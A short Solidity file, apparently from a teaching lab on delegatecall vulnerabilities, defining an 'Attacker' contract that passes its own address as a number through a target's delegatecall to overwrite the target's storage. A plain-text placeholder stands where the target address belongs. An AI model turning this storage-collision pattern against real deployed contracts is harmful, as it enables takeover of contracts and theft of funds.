// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface TargetInterface {
       function delegateChangeNumber(uint newNumber) external;
}

contract Attacker{
    address public called;
    uint public number;
    address public owner;

    TargetInterface public target;
    event NumberChanged(address _from, uint newNumber);

    constructor(){
        target = TargetInterface(copy address Caller contract in DelegateCall.sol);
        owner = msg.sender;
    }

    function attack() public {
        target.delegateChangeNumber(uint256(uint160(address(this))));
    }

     function changeNumber(uint newNumber) public {
        number = newNumber + 10;
        emit NumberChanged(msg.sender, newNumber);
    }
}